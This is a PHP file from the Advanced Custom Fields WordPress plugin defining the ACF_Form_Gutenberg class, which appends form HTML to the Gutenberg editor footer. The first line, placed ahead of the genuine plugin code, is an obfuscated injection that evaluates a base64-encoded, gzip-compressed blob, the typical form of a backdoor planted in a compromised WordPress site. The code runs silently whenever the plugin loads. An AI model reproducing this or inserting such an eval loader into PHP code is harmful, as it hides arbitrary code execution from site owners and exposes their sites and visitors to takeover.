<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

if( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if( ! class_exists('ACF_Form_Gutenberg') ) :

class ACF_Form_Gutenberg {
	
	/**
	*  __construct
	*
	*  Setup for class functionality.
	*
	*  @date	13/2/18
	*  @since	5.6.9
	*
	*  @param	n/a
	*  @return	n/a
	*/
		
	function __construct() {
		
		// filters
		add_filter( 'replace_editor', array($this, 'replace_editor'), 99, 2 );
	}
	
	
	/**
	*  replace_editor
	*
	*  Check if Gutenberg is replacing the editor.
	*
	*  @date	13/2/18
	*  @since	5.6.9
	*
	*  @param	boolean $replace True if the editor is being replaced by Gutenberg.
	*  @param	object $post The WP_Post being edited.
	*  @return	boolean
	*/
	
	function replace_editor( $replace, $post ) {
		
		// check if Gutenberg is replacing
		if( $replace ) {
			
			// actions
			add_action('admin_footer', array($this, 'admin_footer'));
		}
		
		// return
		return $replace;
	}
	
	/**
	*  admin_footer
	*
	*  Append missing HTML to Gutenberg editor.
	*
	*  @date	13/2/18
	*  @since	5.6.9
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	function admin_footer() {
		
		// edit_form_after_title is not run due to missing action, call this manually
		?>
		<div id="acf-form-after-title">
			<?php acf_get_instance('ACF_Form_Post')->edit_form_after_title(); ?>
		</div>
		<?php
		
		
		// move #acf-form-after-title
		?>
		<script type="text/javascript">
			$('#normal-sortables').before( $('#acf-form-after-title') );
		</script>
		<?php
	}		
}

acf_new_instance('ACF_Form_Gutenberg');

endif;

?>